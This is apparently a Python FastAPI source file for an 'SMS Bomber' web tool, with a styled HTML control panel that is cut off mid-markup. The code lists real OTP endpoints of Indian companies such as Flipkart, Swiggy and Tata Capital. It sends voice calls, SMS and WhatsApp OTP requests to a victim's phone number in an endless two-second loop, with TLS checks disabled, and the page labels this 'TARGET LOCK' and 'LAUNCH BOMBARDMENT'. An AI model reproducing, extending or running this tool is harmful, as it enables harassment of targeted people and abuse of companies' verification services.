from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === COMPLETE API LIST FROM YOUR BOT ===
ULTIMATE_APIS = [
    # === CALL APIs ===
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zivame Voice Call",
        "type": "Call", 
        "url": "https://api.zivame.com/v2/customer/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
    },
    # === SMS APIs ===
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Doubtnut",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    # === WhatsApp APIs ===
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(
            method=api["method"],
            url=api["url"],
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
                return True
    except:
        pass
    return False

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Samarth SMS Bomber | Royal Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Cinzel:wght@400;600;700;900&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cinzel', 'Inter', serif;
            background: #070b17;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(30, 58, 138, 0.3) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(37, 99, 235, 0.2) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 50%);
            min-height: 100vh;
            color: #e2e8f0;
            overflow-x: hidden;
        }
        .gothic-text { font-family: 'Uncial Antiqua', 'Cinzel', serif; }
        .gothic-modern { font-family: 'Cinzel', serif; }
        
        /* GLOW EFFECTS - VISIBLE TEXT */
        .glow-blue { text-shadow: 0 0 10px rgba(59,130,246,0.4), 0 0 20px rgba(59,130,246,0.2); }
        .glow-gold { text-shadow: 0 0 10px rgba(251,191,36,0.5), 0 0 20px rgba(251,191,36,0.3); }
        .glow-white { text-shadow: 0 0 10px rgba(255,255,255,0.2); }
        .glow-purple { text-shadow: 0 0 10px rgba(139,92,246,0.4), 0 0 20px rgba(139,92,246,0.2); }
        
        .glass-royal {
            background: rgba(7, 11, 23, 0.8);
            backdrop-filter: blur(24px);
            border: 1px solid rgba(56, 189, 248, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6), inset 0 0 60px rgba(37,99,235,0.03);
        }
        .glass-dark {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(56, 189, 248, 0.06);
        }
        
        .input-royal {
            background: rgba(0, 0, 0, 0.7);
            border: 1.5px solid rgba(56, 189, 248, 0.15);
            transition: all 0.4s ease;
            color: #f1f5f9;
            font-family: 'Cinzel', serif;
            font-size: 1.15rem;
            letter-spacing: 0.08em;
        }
        .input-royal:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 30px rgba(59,130,246,0.2), inset 0 0 30px rgba(59,130,246,0.05);
            outline: none;
        }
        .input-royal::placeholder {
            color: rgba(148,163,184,0.2);
            font-weight: 300;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #1e3a8a, #1d4ed8);
            box-shadow: 0 4px 30px rgba(37,99,235,0.35);
            transition: all 0.3s ease;
            font-family: 'Cinzel', serif;
            font-weight: 700;
            letter-spacing: 0.05em;
            border: none;
            color: white;
            cursor: pointer;
        }
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 40px rgba(37,99,235,0.5);
        }
        .btn-primary:active { transform: scale(0.97); }
        
        .btn-stop {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(239,68,68,0.2);
            transition: all 0.3s ease;
            font-family: 'Cinzel', serif;
            font-weight: 600;
            color: #e2e8f0;
            cursor: pointer;
        }
        .btn-stop:hover {
            background: rgba(239,68,68,0.15);
            border-color: rgba(239,68,68,0.4);
            transform: translateY(-2px);
        }
        
        .stat-card {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(56,189,248,0.06);
            transition: all 0.4s ease;
        }
        .stat-card:hover {
            border-color: rgba(59,130,246,0.25);
            transform: translateY(-3px);
            box-shadow: 0 12px 30px -8px rgba(0,0,0,0.5);
        }
        .stat-number { font-family: 'Cinzel', serif; font-weight: 900; }
        
        .progress-royal {
            height: 3px;
            background: rgba(148,163,184,0.08);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            border-radius: 10px;
            transition: width 0.8s cubic-bezier(0.4,0,0.2,1);
            background: linear-gradient(90deg, #3b82f6, #60a5fa);
            box-shadow: 0 0 20px rgba(59,130,246,0.3);
        }
        
        .logs-container {
            scrollbar-width: thin;
            scrollbar-color: rgba(56,189,248,0.15) transparent;
            font-family: 'Inter', monospace;
            font-size: 0.75rem;
        }
        .logs-container::-webkit-scrollbar { width: 4px; }
        .logs-container::-webkit-scrollbar-track { background: transparent; }
        .logs-container::-webkit-scrollbar-thumb {
            background: rgba(56,189,248,0.2);
            border-radius: 10px;
        }
        .log-entry {
            padding: 5px 12px;
            border-radius: 6px;
            transition: all 0.2s;
            border-left: 2px solid transparent;
        }
        .log-entry:hover {
            background: rgba(59,130,246,0.05);
            border-left-color: #3b82f6;
        }
        
        .badge-status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            border-radius: 100px;
            font-size: 0.65rem;
            font-weight: 700;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(56,189,248,0.1);
            font-family: 'Cinzel', serif;
        }
        .dot-status {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            display: inline-block;
        }
        .dot-status.idle { background: #22c55e; box-shadow: 0 0 15px rgba(34,197,94,0.3); }
        .dot-status.active {
            background: #ef4444;
            box-shadow: 0 0 25px rgba(239,68,68,0.6);
            animation: pulse-dot 0.8s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.7); }
        }
        
        .gold-line {
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(251,191,36,0.3), transparent);
        }
        
        /* HEART OVERLAY */
        .heart-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
        }
        .heart-overlay.active {
            display: flex;
            animation: heartFade 3s ease-out forwards;
        }
        @keyframes heartFade {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; }
        }
        .heart-container {
            position: relative;
            width: 300px;
            height: 300px;
            animation: heartPulse 0.5s ease-in-out 6;
        }
        @keyframes heartPulse {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.3); }
            50% { transform: scale(1); }
            75% { transform: scale(1.2); }
        }
        .heart-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: 'Uncial Antiqua', serif;
            font-size: 3rem;
            color: #fbbf24;
            text-shadow: 0 0 30px rgba(251,191,36,0.8), 0 0 60px rgba(251,191,36,0.5), 0 0 90px rgba(251,191,36,0.3);
            z-index: 1;
            text-align: center;
            line-height: 1.2;
        }
        .heart-svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 40px rgba(239,68,68,0.6));
            animation: heartGlow 1.5s ease-in-out infinite alternate;
        }
        @keyframes heartGlow {
            0% { filter: drop-shadow(0 0 40px rgba(239,68,68,0.4)); }
            100% { filter: drop-shadow(0 0 80px rgba(239,68,68,0.8)); }
        }
        
        .crown { font-size: 1.2rem; filter: drop-shadow(0 0 10px rgba(251,191,36,0.3)); }
        
        @media (max-width: 640px) {
            .input-royal { font-size: 1rem; padding: 0.75rem 1rem 0.75rem 3.5rem; }
            .stat-card { padding: 0.75rem; }
            .glass-royal { padding: 1rem; }
            .heart-container { width: 200px; height: 200px; }
            .heart-text { font-size: 2rem; }
        }
    </style>
</head>
<body>

    <!-- HEART OVERLAY -->
    <div class="heart-overlay" id="heartOverlay">
        <div class="heart-container">
            <svg class="heart-svg" viewBox="0 0 100 100">
                <defs>
                    <radialGradient id="heartGrad" cx="50%" cy="50%" r="50%">
                        <stop offset="0%" stop-color="#ef4444"/>
                        <stop offset="50%" stop-color="#dc2626"/>
                        <stop offset="100%" stop-color="#b91c1c"/>
                    </radialGradient>
                    <filter id="heartGlowFilter">
                        <feGaussianBlur stdDeviation="3" result="blur"/>
                        <feMerge>
                            <feMergeNode in="blur"/>
                            <feMergeNode in="SourceGraphic"/>
                        </feMerge>
                    </filter>
                </defs>
                <path d="M50 88 C20 65 0 50 0 35 C0 15 15 0 35 0 C45 0 50 8 50 8 C50 8 55 0 65 0 C85 0 100 15 100 35 C100 50 80 65 50 88Z"
                      fill="url(#heartGrad)" filter="url(#heartGlowFilter)" opacity="0.9"/>
            </svg>
            <div class="heart-text">⚡<br>ATTACK<br>LAUNCHED</div>
        </div>
    </div>

    <!-- AUDIO -->
    <audio id="wrongSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>
    <audio id="attackSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>

    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-10 relative z-10">
        
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-8">
            <div class="flex items-center gap-4">
                <div class="w-14 h-14 lg:w-16 lg:h-16 rounded-xl bg-gradient-to-br from-blue-700 via-indigo-600 to-blue-800 flex items-center justify-center text-3xl shadow-2xl shadow-blue-500/30 border border-blue-400/20">
                    <span class="crown">👑</span>
                </div>
                <div>
                    <h1 class="text-3xl lg:text-5xl font-black tracking-tight gothic-text">
                        <span class="text-blue-400 glow-blue">Samarth</span>
                        <span class="text-yellow-400 glow-gold">SMS</span>
                        <span class="text-white glow-white">Bomber</span>
                    </h1>
                    <p class="text-xs text-gray-400 tracking-[0.2em] mt-0.5 flex items-center gap-2 gothic-modern font-semibold">
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        ROYAL GOTHIC EDITION
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        ⚡ PREMIUM SUITE
                    </p>
                </div>
            </div>
            <div class="flex items-center gap-3 flex-wrap">
                <div class="badge-status">
                    <span class="dot-status idle" id="statusDot"></span>
                    <span id="statusText" class="text-gray-300 glow-white">SYSTEM READY</span>
                </div>
                <div class="hidden sm:block text-xs text-gray-500 font-mono" id="timestamp"></div>
            </div>
        </header>

        <!-- Gold Divider -->
        <div class="gold-line w-full mb-8"></div>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-royal rounded-2xl p-6">
                <h2 class="text-sm font-bold text-blue-400 tracking-wider flex items-center gap-2 mb-4 gothic-modern glow-blue">
                    <span>🎯</span> TARGET LOCK
                </h2>
                <div class="space-y-5">
                    <div>
                        <label class="text-xs text-gray-400 font-medium block mb-1.5 gothic-modern tracking-wider">MOBILE NUMBER</label>
                        <div class="relative">
                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-bold">+91</span>
                            <input id="phone" maxlength="10"
                                   class="input-royal w-full rounded-xl px-12 py-4 text-lg font-mono outline-none transition-all"
                                   placeholder="ENTER 10-DIGIT NUMBER"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,''); validateNumber(this.value)">
                        </div>
                        <div id="phoneFeedback" class="text-xs mt-1.5 h-5"></div>
                    </div>
                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="startAttack()" id="startBtn"
                                class="col-span-2 btn-primary py-4 rounded-xl text-sm flex items-center justify-center gap-2 transition-all">
                            <span>🚀</span> LAUNCH BOMBARDMENT
                        </button>
                        <button onclick="stopAttack()" id="stopBtn"
                                class="col-span-2 hidden btn-stop py-4 rounded-xl text-sm flex items-center justify-center gap-2 transition-all">
                            <span>🛑</span> TERMINATE ATTACK
                        </button>
                    </div>
                    <div class="grid grid-cols-3 gap-2 p-3 bg-black/40 rounded-xl border border-white/5">
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">APIs</div>
                            <div class="text-sm font-bold text-blue-400 glow-blue gothic-modern" id="apiCount">0</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Interval</div>
                            <div class="text-sm font-bold text-cyan-400 glow-blue gothic-modern">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Target</div>
                            <div class="text-sm font-bold text-yellow-400 truncate gothic-modern glow-gold" id="targetDisplay">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats -->
            <div class="lg:col-span-7 glass-royal rounded-2xl p-6">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-sm font-bold text-yellow-400 tracking-wider flex items-center gap-2 gothic-modern glow-gold">
                        <span>📊</span> LIVE METRICS
                    </h2>
                    <span class="text-xs text-gray-500 font-mono glow-white" id="cycleDisplay">CYCLES: 0</span>
                </div>
                <div class="grid grid-cols-3 gap-3">
                    <div class="stat-card rounded-xl p-4 text-center border border-blue-500/10">
                        <div class="text-2xl lg:text-3xl font-bold text-blue-400 stat-number glow-blue" id="calls">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">📞 Calls</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-fill" id="callBar" style="width:0%"></div>
                        </div>
                    </div>
                    <div class="stat-card rounded-xl p-4 text-center border border-cyan-500/10">
                        <div class="text-2xl lg:text-3xl font-bold text-cyan-400 stat-number glow-blue" id="sms">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">✉️ SMS</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-fill" id="smsBar" style="width:0%"></div>
                        </div>
                    </div>
                    <div class="stat-card rounded-xl p-4 text-center border border-purple-500/10">
                        <div class="text-2xl lg:text-3xl font-bold text-purple-400 stat-number glow-purple" id="wa">0</div>
